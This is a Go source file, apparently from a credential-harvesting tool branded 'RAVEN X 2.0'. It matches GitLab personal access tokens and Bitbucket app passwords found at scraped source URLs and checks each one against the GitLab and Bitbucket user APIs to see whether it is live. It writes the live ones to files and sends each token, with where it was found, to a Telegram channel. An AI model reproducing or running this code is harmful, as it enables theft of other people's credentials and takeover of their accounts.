package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"regexp"
)

// GitLab personal access tokens carry the glpat- prefix which is globally
// unique; no surrounding context is required to avoid false positives.
var gitlabPattern = regexp.MustCompile(`glpat-[A-Za-z0-9_-]{20}`)

// Bitbucket app passwords are prefixed with ATBB (32 chars following).
// The context pattern covers env-file declarations like BB_APP_PASSWORD=...
var bitbucketAppPasswordPattern = regexp.MustCompile(`ATBB[A-Za-z0-9]{28}`)
var bitbucketContextPattern = regexp.MustCompile(`(?i)(?:bitbucket[_-]?(?:app[_-]?)?password|BB_APP_PASSWORD|BITBUCKET_APP_PASSWORD)\s*[:=]\s*["']?([A-Za-z0-9]{40,})["']?`)

// CheckGitLab validates a GitLab personal access token by hitting
// GET /api/v4/user with the PRIVATE-TOKEN header. A 200 response
// containing an "id" field confirms the token is live.
func (a *AWSScanner) CheckGitLab(key, sourceURL string) bool {
	if !a.Config.APIValidation.GitLab {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://gitlab.com/api/v4/user", nil)
	if err != nil {
		return false
	}
	req.Header.Set("PRIVATE-TOKEN", key)

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false
	}

	// Confirm the response body contains an "id" field so we don't
	// accidentally fire on endpoints that return 200 for bad tokens.
	body, _ := io.ReadAll(resp.Body)
	var payload map[string]interface{}
	if err := json.Unmarshal(body, &payload); err != nil {
		return false
	}
	if _, hasID := payload["id"]; !hasID {
		return false
	}

	a.logValid("GitLab", fmt.Sprintf("Token: %s", key))
	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_gitlab.txt")
	a.storeValidKeyLimit("GitLab", key, "Active")

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🦊 <b>GITLAB LIVE TOKEN</b>

🔑 <b>Token:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
	go a.sendTelegram(msg)
	return true
}

// CheckBitbucket validates a Bitbucket app password by attempting
// GET /2.0/user with Bearer auth. A 200 response confirms the credential.
func (a *AWSScanner) CheckBitbucket(key, sourceURL string) bool {
	if !a.Config.APIValidation.Bitbucket {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.bitbucket.org/2.0/user", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false
	}

	a.logValid("Bitbucket", fmt.Sprintf("App Password: %s", key))
	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_bitbucket.txt")
	a.storeValidKeyLimit("Bitbucket", key, "Active")

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🪣 <b>BITBUCKET LIVE APP PASSWORD</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
	go a.sendTelegram(msg)
	return true
}
